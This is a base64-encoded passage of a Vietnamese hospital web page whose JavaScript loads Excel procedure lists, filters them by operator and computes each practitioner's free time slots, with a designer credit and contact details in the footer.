Jvb2suU2hlZXRzW3dvcmtib29rLlNoZWV0TmFtZXNbMV1dOw0KICAgICAgICBjb25zdCBqc29uRGF0YSA9IFhMU1gudXRpbHMuc2hlZXRfdG9fanNvbihmaXJzdFNoZWV0LCB7DQogICAgICAgICAgICBoZWFkZXI6IDEsDQogICAgICAgICAgICBkZWZ2YWw6ICIiLA0KICAgICAgICAgICAgYmxhbmtyb3dzOiB0cnVlDQogICAgICAgIH0pOw0KDQogICAgICAgIGNvbnN0IHJvd3MgPSBqc29uRGF0YS5zbGljZSg5KTsNCiAgICAgICAgdG90YWwgPSByb3dzLmxlbmd0aDsNCiAgICB9IGNhdGNoIHsNCiAgICAgICAgdG90YWwgPSAxMDAwOw0KICAgIH0NCg0KICAgIGNvbnN0IHN0ZXAgPSAxMDA7DQogICAgY29uc3Qgc3RlcHMgPSBNYXRoLmNlaWwodG90YWwgLyBzdGVwKTsNCiAgICBjb25zdCBpbnRlcnZhbCA9IDI2MDAgLyBzdGVwczsNCg0KICAgIGZvciAobGV0IGkgPSAxOyBpIDw9IHN0ZXBzOyBpKyspIHsNCiAgICAgICAgY29uc3QgY3VycmVudCA9IE1hdGgubWluKGkgKiBzdGVwLCB0b3RhbCk7DQogICAgICAgIGxvYWRpbmdUZXh0LmlubmVySFRNTCA9ICc8aSBjbGFzcz0iZmFzIGZhLXVzZXItbWQiIHN0eWxlPSJmb250LXNpemU6MjRweDtjb2xvcjojMjk4MGI5O21hcmdpbi1ib3R0b206MTBweDsiPjwvaT48YnIvPsSQYW5nIHBow6JuIHTDrWNoIGThu68gbGnhu4d1IHThu6tuZyBi4buHbmggbmjDom4uLi48YnI+JyArIGN1cnJlbnQgKyAnIC8gJyArIHRvdGFsOw0KICAgICAgICBhd2FpdCBuZXcgUHJvbWlzZShyID0+IHNldFRpbWVvdXQociwgaW50ZXJ2YWwpKTsNCiAgICB9DQoNCiAgICBsb2FkaW5nVGV4dC5pbm5lckhUTUwgPSAnPGkgY2xhc3M9ImZhcyBmYS1jaGVjay1jaXJjbGUiIHN0eWxlPSJmb250LXNpemU6MjRweDtjb2xvcjpncmVlbjttYXJnaW4tYm90dG9tOjEwcHg7Ij48L2k+PGJyLz7EkMOjIGtp4buDbSB0cmEgeG9uZy4uLic7DQogICAgcHJvZ3Jlc3NCYXIuc3R5bGUud2lkdGggPSAnMTAwJSc7DQogICAgYXdhaXQgbmV3IFByb21pc2UocmVzb2x2ZSA9PiBzZXRUaW1lb3V0KHJlc29sdmUsIDEwMDApKTsNCg0KaWYgKCF3aW5kb3cuaXNLaG9hTG9pKSB7DQogICAgcG9wdXAuY2xhc3NMaXN0LnJlbW92ZSgnc2hvdycpOw0KICAgIHNldFRpbWVvdXQoKCkgPT4geyBwb3B1cC5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOyB9LCA1MDApOw0KDQoNCn0NCg0KDQoNCiBlbHNlIHsNCiAgICAvLyBO4bq/dSDEkWFuZyBs4buXaSBLaG9hLCBLSMOUTkcgxJHGsOG7o2Mg4bqpbiBwb3B1cA0KICAgIHBvcHVwLmNsYXNzTGlzdC5hZGQoJ3Nob3cnKTsNCiAgICBwb3B1cC5zdHlsZS5kaXNwbGF5ID0gJ2ZsZXgnOw0KfQ0KICAgIGhhbmRsZUZpbGUoKTsNCgkNCgkNCgkNCgkNCnNldFRpbWVvdXQoKCkgPT4gew0KICAgIC8vIOKdjCBO4bq/dSDEkWFuZyBs4buXaSB0w6puIGtob2EgdGjDrCBnaeG7ryBuZ3V5w6puIHBvcHVwLCBLSMOUTkcgxJHGsOG7o2Mg4bqpbiwgS0jDlE5HIGhp4buHbiBuw7p0DQogICAgaWYgKHdpbmRvdy5pc0tob2FMb2kpIHsNCiAgICAgICAgcG9wdXAuc3R5bGUuZGlzcGxheSA9ICdmbGV4JzsNCiAgICAgICAgcG9wdXAuY2xhc3NMaXN0LmFkZCgnc2hvdycpOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KDQogICAgLy8g4pyFIE7hur91IGtow7RuZyBs4buXaSwgdGjDrCDhuqluIHBvcHVwIHbDoCBoaeG7h24gbsO6dCBjaOG7qWMgbsSDbmcNCiAgICBwb3B1cC5jbGFzc0xpc3QucmVtb3ZlKCdzaG93Jyk7DQogICAgcG9wdXAuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCg0KICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJ2J1dHRvbi5idG4nKS5mb3JFYWNoKGJ0biA9PiB7DQogICAgICAgIGlmIChidG4udGV4dENvbnRlbnQuaW5jbHVkZXMoJ0dp4budIHRy4buRbmcnKSB8fCBidG4udGV4dENvbnRlbnQuaW5jbHVkZXMoJ1Phuq9jIHRodeG7kWMgdGhhbmcnKSkgew0KICAgICAgICAgICAgYnRuLnN0eWxlLmRpc3BsYXkgPSAnaW5saW5lLWJsb2NrJzsNCiAgICAgICAgfQ0KICAgIH0pOw0KfSwgNTAwKTsNCg0KDQoJDQp9KTsNCg0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyBHw6FuIHPhu7Ega2nhu4duIGNobyBkcm9wZG93biBs4buNYw0KICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ29wZXJhdG9yU2VsZWN0JykuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgZmlsdGVyQnlPcGVyYXRvcik7DQogICAgICAgICAgICANCgkJCQ0KCQkJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Nob3dEb2N0b3JDaGVja2JveCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGZpbHRlckJ5T3BlcmF0b3IpOw0KCQkJDQoJCQkNCiAgICAgICAgICAgIC8vIEfDoW4gc+G7sSBraeG7h24gY2hvIHJhZGlvIGJ1dHRvbiBjaOG7jW4ga2h1bmcgZ2nhu50NCiAgICAgICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJ2lucHV0W25hbWU9InRpbWVPcHRpb24iXScpLmZvckVhY2gocmFkaW8gPT4gew0KICAgICAgICAgICAgICAgIHJhZGlvLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGZ1bmN0aW9uKCkgew0KICAgICAgICAgICAgICAgICAgICBpZiAoYWxsUHJvY2VkdXJlcy5sZW5ndGggPiAwKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBnZW5lcmF0ZVRpbWVTdWdnZXN0aW9ucyhhbGxQcm9jZWR1cmVzKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGZpbHRlckJ5T3BlcmF0b3IoKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgfSk7DQoJCQkNCgkJCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdvcGVyYXRvclNlbGVjdCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGZ1bmN0aW9uKCkgew0KICAgIGZpbHRlckJ5T3BlcmF0b3IoKTsNCn0pOw0KDQogZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ29wZXJhdG9yU2VsZWN0RXJyb3InKS5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCBmdW5jdGlvbiAoKSB7DQogICAvLyBjaOG7iSByZW5kZXIgbOG6oWksIEtIw5RORyDEkeG7pW5nIGRyb3Bkb3duIGLDqm4ga2lhDQogICBmaWx0ZXJCeU9wZXJhdG9yKCk7DQogfSk7DQoJCQkNCiAgICAgICAgfSk7DQogICAgPC9zY3JpcHQ+DQo8ZGl2IGNsYXNzPSJwcm9jZWR1cmUtaW5mbyI+PGNlbnRlcj4gDQpEZXNpZ24gQnkgPGEgaHJlZj0iaHR0cDovL2ZiLmNvbS9jaGF1aHV5bmgwMTA0IiB0YXJnZXQ9Il9ibGFuayI+IERyLkNow6J1PC9hPjxici8+DQogICAgICAgICAgICAgICAgTuG6v3UgQ8OzIELhuqV0IEvhu7MgVsaw4bubbmcgTeG6r2MgR8OsIFZ1aSBMw7JuZyBMSCA6IDxici8+DQogICAgICAgICAgICAgICAgRW1haWw6IGNoYXVodXluaDAxMDRAZ21haWwuY29tPGJyLz4NCiAgICAgICAgICAgICAgICBTRFQ6IDA3OS41NjcuOTM1MDwvY2VudGVyPg0KPC9kaXY+DQo8c2NyaXB0Pg0KICAvLyBI4buXIHRy4bujIG5o4bqlbiBFbnRlciB04burIMO0IHVzZXJuYW1lIGhv4bq3YyBwYXNzd29yZA0KICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndXNlcm5hbWVJbnB1dCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2tleXVwJywgZnVuY3Rpb24oZXZlbnQpIHsNCiAgICBpZiAoZXZlbnQua2V5ID09PSAnRW50ZXInKSB7DQogICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGFzc3dvcmRJbnB1dCcpLmZvY3VzKCk7DQogICAgfQ0KICB9KTsNCg0KICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGFzc3dvcmRJbnB1dCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2tleXVwJywgZnVuY3Rpb24oZXZlbnQpIHsNCiAgICBpZiAoZXZlbnQua2V5ID09PSAnRW50ZXInKSB7DQogICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5CdG4nKS5jbGljaygpOw0KICAgIH0NCiAgfSk7DQoNCi8vID09PT09PSBU4buwIMSQ4buYTkcgUVXDiVQgVEjGryBN4bukQyAmIENI4buMTiBGSUxFIE3hu5pJIE5I4bqkVCA9PT09PT0NCg0KZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZvbGRlckJ0bicpLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgKCkgPT4gew0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmb2xkZXJJbnB1dCcpLmNsaWNrKCk7DQp9KTsNCg0KZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZvbGRlcklucHV0JykuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgYXN5bmMgKGUpID0+IHsNCiBhd2FpdCBlbnN1cmVYTFNYKCk7IC8vIG7huqFwIFhMU1ggdHLGsOG7m2Mga2hpIMSR4buNYyB3b3JrYm9vaw0KICAgIGNvbnN0IGZpbGVzID0gQXJyYXkuZnJvbShlLnRhcmdldC5maWxlcykuZmlsdGVyKGYgPT4gL1wuKHhsc3h8eGxzfGNzdikkL2kudGVzdChmLm5hbWUpKTsNCiAgICBjb25zdCBzdGF0dXNEaXYgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2NhblN0YXR1cycpOw0KICAgIGNvbnN0IGZpbGVJbnB1dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWxlSW5wdXQnKTsNCg0KICAgIGlmIChmaWxlcy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgc3RhdHVzRGl2LnN0eWxlLmNvbG9yID0gJ3JlZCc7DQogICAgICAgIHN0YXR1c0Rpdi5pbm5lckhUTUwgPSAnS2jDtG5nIHTDrG0gdGjhuqV5IGZpbGUgRXhjZWwgaOG7o3AgbOG7hyB0cm9uZyB0aMawIG3hu6VjLic7DQogICAgICAgIHJldHVybjsNCiAgICB9DQoNCiAgICBsZXQgdmFsaWRGaWxlID0gbnVsbDsNCg0KICAgIGZvciAoY29uc3QgZmlsZSBvZiBmaWxlcy5zb3J0KChhLCBiKSA9PiBiLmxhc3RNb2RpZmllZCAtIGEubGFzdE1vZGlmaWVkKSkgew0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgY29uc3QgZGF0YSA9IGF3YWl0IGZpbGUuYXJyYXlCdWZmZXIoKTsNCiAgICAgICAgICAgIGNvbnN0IHdvcmtib29rID0gWExTWC5yZWFkKGRhdGEsIHsgdHlwZTogJ2FycmF5JyB9KTsNCg0KICAgICAgICAgICAgaWYgKCF3b3JrYm9vay5TaGVldE5hbWVzWzFdKSBjb250aW51ZTsgLy8gY+G6p24gU2hlZXQgdGjhu6kgMg0KDQogICAgICAgICAgICBjb25zdCBzaGVldCA9IHdvcmtib29rLlNoZWV0c1t3b3JrYm9vay5TaGVldE5hbWVzWzFdXTsNCiAgICAgICAgICAgIGNvbnN0IGpzb25EYXRhID0gWExTWC51dGlscy5zaGVldF90b19qc29uKHNoZWV0LCB7IGhlYWRlcjogMSwgZGVmdmFsOiAiIiwgYmxhbmtyb3dzOiB0cnVlIH0pOw0KDQogICAgICAgICAgICBpZiAoanNvbkRhdGEubGVuZ3RoID49IDEwKSB7IC8vIMOtdCBuaOG6pXQgMiBkw7JuZyBoZWFkZXIgdsOgIGPDsyBk4buvIGxp4buHdSBkw7JuZyAxMA0KICAgICAgICAgICAgICAgIHZhbGlkRmlsZSA9IGZpbGU7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICB9DQogICAgICAgIH0gY2F0Y2ggKGVycikgew0KICAgICAgICAgICAgY29uc29sZS5lcnJvcihgTOG7l2kgxJHhu41jIGZpbGUgJHtmaWxlLm5hbWV9OmAsIGVycik7DQogICAgICAgIH0NCiAgICB9DQoNCiAgICBpZiAodmFsaWRGaWxlKSB7DQogICAgICAgIGNvbnN0IGR0ID0gbmV3IERhdGFUcmFuc2ZlcigpOw0KICAgICAgICBkdC5pdGVtcy5hZGQodmFsaWRGaWxlKTsNCiAgICAgICAgZmlsZUlucHV0LmZpbGVzID0gZHQuZmlsZXM7DQoNCiAgICAgICAgLy8gY+G6rXAgbmjhuq10IHRy4bqhbmcgdGjDoWkNCiAgICAgICAgc3RhdHVzRGl2LmlubmVySFRNTCA9IGA8aSBjbGFzcz0iZmFzIGZhLWZvbGRlci1vcGVuIj48L2k+IMSQw6MgY2jhu41uIGZpbGU6IDxiPiR7dmFsaWRGaWxlLm5hbWV9PC9iPmA7DQogICAgICAgIHN0YXR1c0Rpdi5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICAgICAgc3RhdHVzRGl2LnN0eWxlLmNvbG9yID0gJyMyYzNlNTAnOw0KDQogICAgICAgIC8vIEfhu41pIGtp4buDbSB0cmENCiAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2FuYWx5emVCdG4nKS5jbGljaygpOw0KICAgIH0gZWxzZSB7DQogICAgICAgIHN0YXR1c0Rpdi5zdHlsZS5jb2xvciA9ICdyZWQnOw0KICAgICAgICBzdGF0dXNEaXYuaW5uZXJIVE1MID0gJ0tow7RuZyB0w6xtIMSRxrDhu6NjIGZpbGUgY8OzIGPhuqV1IHRyw7pjIGjhu6NwIGzhu4cuIFZ1aSBsw7JuZyBraeG7g20gdHJhIGzhuqFpLic7DQogICAgfQ0KfSk7DQoNCg0KPC9zY3JpcHQ+DQo8ZGl2IGNsYXNzPSJ0b2FzdCIgaWQ9InRvYXN0Ij48L2Rpdj4NCjwhLS0gUG9wdXAgbG9hZGluZyAtLT4NCjxkaXYgaWQ9ImxvYWRpbmdQb3B1cCIgc3R5bGU9ImRpc3BsYXk6bm9uZTtwb3NpdGlvbjpmaXhlZDt0b3A6MDtsZWZ0OjA7d2lkdGg6MTAwJTtoZWlnaHQ6MTAwJTtiYWNrZ3JvdW5kOnJnYmEoMCwwLDAsMC41KTt6LWluZGV4Ojk5OTk7anVzdGlmeS1jb250ZW50OmNlbnRlcjthbGlnbi1pdGVtczpjZW50ZXI7Zm9udC1mYW1pbHk6J0ludGVyJyxzYW5zLXNlcmlmIj4NCjxkaXYgc3R5bGU9ImJhY2tncm91bmQ6I2ZmZjtwYWRkaW5nOjMwcHggNDBweDtib3JkZXItcmFkaXVzOjEwcHg7dGV4dC1hbGlnbjpjZW50ZXI7Ym94LXNoYWRvdzowIDAgMTVweCByZ2JhKDAsMCwwLDAuMyk7bWF4LXdpZHRoOjkwJTtmb250LXNpemU6MThweCI+DQo8ZGl2IGlkPSJsb2FkaW5nVGV4dCI+DQo8aSBjbGFzcz0iZmFzIGZhLXNwaW5uZXIgZmEtc3BpbiIgc3R5bGU9ImZvbnQtc2l6ZToyNHB4O2NvbG9yOiMzNDk4ZGI7bWFyZ2luLWJvdHRvbToxMHB4OyI+PC9pPjxici8+DQogICAgICDEkGFuZyBn4butaSBk4buvIGxp4buHdSB24buBIG3DoXkgY2jhu6cuLi4NCiAgICA8L2Rpdj4NCjxkaXYgaWQ9InByb2dyZXNzQmFyQ29udGFpbmVyIj4NCjxkaXYgaWQ9InByb2dyZXNzQmFyIj48L2Rpdj4NCjxkaXYgaWQ9ImF2YWlsYWJpbGl0eVRhYmxlIiBzdHlsZT0iZGlzcGxheTogbm9uZTsgbWFyZ2luLXRvcDogMjBweDsiPg0KICA8aDI+VGjhu5FuZyBrw6ogZ2nhu50gdHLhu5FuZyB04burbmcgbmfGsOG7nWk8L2gyPg0KICA8dGFibGUgY2xhc3M9ImVycm9yLXRhYmxlIj4NCiAgICA8dGhlYWQ+DQogICAgICA8dHI+DQogICAgICAgIDx0aD5OZ8aw4budaSB0aOG7sWMgaGnhu4duPC90aD4NCiAgICAgICAgPHRoPk5nw6B5PC90aD4NCiAgICAgICAgDQogICAgICAgIDx0aD5HaeG7nSB0cuG7kW5nIGJ14buVaSBzw6FuZzwvdGg+DQogICAgICAgIDx0aD5HaeG7nSB0cuG7kW5nIGJ14buVaSBjaGnhu4F1PC90aD4NCiAgICAgIDwvdHI+DQogICAgPC90aGVhZD4NCiAgICA8dGJvZHkgaWQ9ImF2YWlsYWJpbGl0eUJvZHkiPjwvdGJvZHk+DQogIDwvdGFibGU+DQo8L2Rpdj4NCjwhLS0gS+G6vlQgVEjDmkM6IELhuqJORyBHSeG7nCBUUuG7kE5HIFThu6pORyBOR8av4bucSSAtLT4NCjwvZGl2Pg0KPC9kaXY+DQo8L2Rpdj4NCjwvZGl2Pg0KDQo8c2NyaXB0Pg0KZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiRE9NQ29udGVudExvYWRlZCIsIGZ1bmN0aW9uKCkgew0KICBjb25zdCBub2lkdW5nID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIm5vaWR1bmciKTsNCiAgY29uc3QgbGlzdDEgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIubGlzdDEiKTsNCg0KICBpZiAobm9pZHVuZyAmJiBsaXN0MSkgew0KICAgIGNvbnN0IHRleHQgPSBub2lkdW5nLnRleHRDb250ZW50IHx8IG5vaWR1bmcuaW5uZXJUZXh0IHx8ICIiOw0KICAgIGlmICh0ZXh0LnRyaW0oKSA9PT0gIiIpIHsNCiAgICAgIGxpc3QxLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7DQogICAgfQ0KICB9DQp9KTsNCg0KLy8gPT09PSBUw41OSCBUT8OBTiBHSeG7nCBUUuG7kE5HIENITyBU4buqTkcgTkfGr+G7nEkgPT09PQ0KDQoNCg0KZnVuY3Rpb24gdG9nZ2xlQXZhaWxhYmlsaXR5KCkgew0KICAgIGNvbnN0IHRhYmxlID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2F2YWlsYWJpbGl0eVRhYmxlJyk7DQogICAgY29uc3QgZmlsdGVyQmxvY2sgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYXZhaWxhYmlsaXR5RmlsdGVyQmxvY2snKTsNCiAgICBpZiAodGFibGUuc3R5bGUuZGlzcGxheSA9PT0gJ25vbmUnKSB7DQogICAgICAgIHRhYmxlLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgICAgICBpZiAoZmlsdGVyQmxvY2spIGZpbHRlckJsb2NrLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgICAgICBjYWxjdWxhdGVBdmFpbGFiaWxpdHkoKTsNCiAgICB9IGVsc2Ugew0KICAgICAgICB0YWJsZS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgICAgICBpZiAoZmlsdGVyQmxvY2spIGZpbHRlckJsb2NrLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgfQ0KfQ0KDQoNCmZ1bmN0aW9uIGNhbGN1bGF0ZUF2YWlsYWJpbGl0eSgpIHsNCiAgICBjb25zdCBncm91cHMgPSB7fTsNCiAgICBhbGxQcm9jZWR1cmVzLmZvckVhY2gocHJvYyA9PiB7DQogICAgICAgIGNvbnN0IGtleSA9IGAke3Byb2Mub3BlcmF0b3J9XyR7cHJvYy5kYXRlfWA7DQogICAgICAgIGlmICghZ3JvdXBzW2tleV0pIGdyb3Vwc1trZXldID0gW107DQogICAgICAgIGdyb3Vwc1trZXldLnB1c2gocHJvYyk7DQogICAgfSk7DQoNCiAgICBjb25zdCB0Ym9keSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhdmFpbGFiaWxpdHlCb2R5Jyk7DQogICAgdGJvZHkuaW5uZXJIVE1MID0gJyc7DQoNCiAgICBjb25zdCBzZWxlY3RlZE9wID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZpbHRlck9wZXJhdG9yJyk/LnZhbHVlIHx8ICdhbGwnOw0KICAgIGNvbnN0IHNlbGVjdGVkRGF0ZSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWx0ZXJEYXRlJyk/LnZhbHVlIHx8ICdhbGwnOw0KDQogICAgLy8gQ2jhu4kga2jhu59pIHThuqFvIGRyb3Bkb3duIDEgbOG6p24NCiAgICBpZiAoIWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWx0ZXJPcGVyYXRvcicpLmRhdGFzZXQuaW5pdGlhbGl6ZWQpIHsNCiAgICAgICAgY29uc3Qgb3BlcmF0b3JzID0gWy4uLm5ldyBTZXQoYWxsUHJvY2VkdXJlcy5tYXAocCA9PiBwLm9wZXJhdG9yKSldLnNvcnQoKTsNCiAgICAgICAgY29uc3QgZGF0ZXMgPSBbLi4ubmV3IFNldChhbGxQcm9jZWR1cmVzLm1hcChwID0+IHAuZGF0ZSkpXS5zb3J0KChhLCBiKSA9PiB7DQogICAgICAgICAgICBjb25zdCBbZGEsIG1hLCB5YV0gPSBhLnNwbGl0KCcvJykubWFwKE51bWJlcik7DQogICAgICAgICAgICBjb25zdCBbZGIsIG1iLCB5Yl0gPSBiLnNwbGl0KCcvJykubWFwKE51bWJlcik7DQogICAgICAgICAgICByZXR1cm4gbmV3IERhdGUoeWEsIG1hIC0gMSwgZGEpIC0gbmV3IERhdGUoeWIsIG1iIC0gMSwgZGIpOw0KICAgICAgICB9KTsNCg0KICAgICAgICBjb25zdCBvcFNlbGVjdCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWx0ZXJPcGVyYXRvcicpOw0KICAgICAgICBjb25zdCBkYXRlU2VsZWN0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZpbHRlckRhdGUnKTsNCg0KICAgICAgICBvcFNlbGVjdC5pbm5lckhUTUwgPSAnPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjPC9vcHRpb24+JyArDQogICAgICAgICAgICBvcGVyYXRvcnMubWFwKG9wID0+IGA8b3B0aW9uIHZhbHVlPSIke29wfSI+JHtvcC5yZXBsYWNlKC8sL2csICcnKX08L29wdGlvbj5gKS5qb2luKCcnKTsNCiAgICAgICAgZGF0ZVNlbGVjdC5pbm5lckhUTUwgPSAnPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjPC9vcHRpb24+JyArDQogICAgICAgICAgICBkYXRlcy5tYXAoZCA9PiBgPG9wdGlvbiB2YWx1ZT0iJHtkfSI+JHtkfTwvb3B0aW9uPmApLmpvaW4oJycpOw0KDQogICAgICAgIG9wU2VsZWN0LmRhdGFzZXQuaW5pdGlhbGl6ZWQgPSAndHJ1ZSc7DQogICAgICAgIGRhdGVTZWxlY3QuZGF0YXNldC5pbml0aWFsaXplZCA9ICd0cnVlJzsNCg0KICAgICAgICBvcFNlbGVjdC5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCBjYWxjdWxhdGVBdmFpbGFiaWxpdHkpOw0KICAgICAgICBkYXRlU2VsZWN0LmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGNhbGN1bGF0ZUF2YWlsYWJpbGl0eSk7DQogICAgfQ0KDQogICAgT2JqZWN0LmtleXMoZ3JvdXBzKS5mb3JFYWNoKGtleSA9PiB7DQogICAgICAgIGNvbnN0IFtvcGVyYXRvciwgZGF0ZV0gPSBrZXkuc3BsaXQoJ18nKTsNCiAgICAgICAgaWYgKChzZWxlY3RlZE9wICE9PSAnYWxsJyAmJiBvcGVyYXRvciAhPT0gc2VsZWN0ZWRPcCkgfHwNCiAgICAgICAgICAgIChzZWxlY3RlZERhdGUgIT09ICdhbGwnICYmIGRhdGUgIT09IHNlbGVjdGVkRGF0ZSkpIHJldHVybjsNCg0KICAgICAgICBjb25zdCBwcm9jZWR1cmVzID0gZ3JvdXBzW2tleV07DQogICAgICAgIHByb2NlZHVyZXMuc29ydCgoYSwgYikgPT4gYS5zdGFydCAtIGIuc3RhcnQpOw0KDQogICAgICAgIGNvbnN0IG1vcm5pbmdTdGFydCA9IDcgKiAzNjAwOw0KICAgICAgICBjb25zdCBtb3JuaW5nRW5kID0gMTEuNSAqIDM2MDA7DQogICAgICAgIGNvbnN0IGFmdGVybm9vblN0YXJ0ID0gMTMuNSAqIDM2MDA7DQogICAgICAgIGNvbnN0IGFmdGVybm9vbkVuZCA9IDE3ICogMzYwMDsNCg0KICAgICAgICBjb25zdCBtb3JuaW5nRnJlZSA9IGdldEZyZWVTbG90cyhwcm9jZWR1cmVzLCBtb3JuaW5nU3RhcnQsIG1vcm5pbmdFbmQpOw0KICAgICAgICBjb25zdCBhZnRlcm5vb25GcmVlID0gZ2V0RnJlZVNsb3RzKHByb2NlZHVyZXMsIGFmdGVybm9vblN0YXJ0LCBhZnRlcm5vb25FbmQpOw0KDQogICAgICAgIGNvbnN0IHJvdyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3RyJyk7DQogICAgICAgIHJvdy5jbGFzc0xpc3QuYWRkKCJoZXJiLXJvdyIpOw0KICAgICAgICByb3cuaW5uZXJIVE1MID0gYA0KICAgICAgICAgICAgPHRkPjxhIGhyZWY9IiMiIG9uY2xpY2s9InNob3dQcm9jZWR1cmVzRm9yT3BlcmF0b3IoXGAke29wZXJhdG9yfVxgLCBcYCR7ZGF0ZX1cYCk7cmV0dXJuIGZhbHNlOyIgc3R5bGU9ImNvbG9yOiMzNDk4ZGI7Zm9udC13ZWlnaHQ6Ym9sZCI+JHtvcGVyYXRvci5yZXBsYWNlKC8sL2csICcnKX08L2E+PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke2RhdGV9PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke21vcm5pbmdGcmVlfTwvdGQ+DQogICAgICAgICAgICA8dGQ+JHthZnRlcm5vb25GcmVlfTwvdGQ+DQogICAgICAgIGA7DQogICAgICAgIHRib2R5LmFwcGVuZENoaWxkKHJvdyk7DQogICAgfSk7DQp9DQoNCg0KZnVuY3Rpb24gZ2V0RnJlZVNsb3RzKHByb2NlZHVyZXMsIHN0YXJ0LCBlbmQpIHsNCiAgICBjb25zdCBidXN5ID0gcHJvY2VkdXJlcy5tYXAocCA9PiAoew0KICAgICAgICBzdGFydDogcC5zdGFydCwNCiAgICAgICAgZW5kOiBwLmVuZCArICgocC5wcm9jZWR1cmVJbmZvPy5idWZmZXIgfHwgMCkgKiA2MCkNCiAgICB9KSkuZmlsdGVyKHAgPT4gcC5lbmQgPiBzdGFydCAmJiBwLnN0YXJ0IDwgZW5kKTsNCg0KICAgIGJ1c3kuc29ydCgoYSwgYikgPT4gYS5zdGFydCAtIGIuc3RhcnQpOw0KDQogICAgY29uc3QgZnJlZSA9IFtdOw0KICAgIGxldCBjdXJzb3IgPSBzdGFydDsNCg0KICAgIGZvciAoY29uc3QgYiBvZiBidXN5KSB7DQogICAgICAgIGlmIChiLnN0YXJ0ID4gY3Vyc29yICYmIGIuc3RhcnQgPiBzdGFydCAmJiBjdXJzb3IgPCBlbmQpIHsNCiAgICAgICAgICAgIGNvbnN0IGZyZWVTdGFydCA9IE1hdGgubWF4KGN1cnNvciwgc3RhcnQpOw0KICAgICAgICAgICAgY29uc3QgZnJlZUVuZCA9IE1hdGgubWluKGIuc3RhcnQsIGVuZCk7DQogICAgICAgICAgICBpZiAoZnJlZUVuZCA+IGZyZWVTdGFydCkgew0KICAgICAgICAgICAgICAgIGZyZWUucHVzaChgJHtmb3JtYXRUaW1lKGZyZWVTdGFydCl9IC0gJHtmb3JtYXRUaW1lKGZyZWVFbmQpfWApOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGN1cnNvciA9IE1hdGgubWF4KGN1cnNvciwgYi5lbmQpOw0KICAgIH0NCg0KICAgIGlmIChjdXJzb3IgPCBlbmQpIHsNCiAgICAgICAgZnJlZS5wdXNoKGAke2Zvcm1hdFRpbWUoY3Vyc29yKX0gLSAke2Zvcm1hdFRpbWUoZW5kKX1gKTsNCiAgICB9DQoNCiAgICByZXR1cm4gZnJlZS5sZW5ndGggPyBmcmVlLmpvaW4oJzxicj4nKSA6ICc8aT5LaMO0bmcgY8OybiB0cuG7kW5nPC9pPic7DQp9DQoNCmZ1bmN0aW9uIGZvcm1hdFRpbWUoc2VjKSB7DQogICAgY29uc3QgaCA9IE1hdG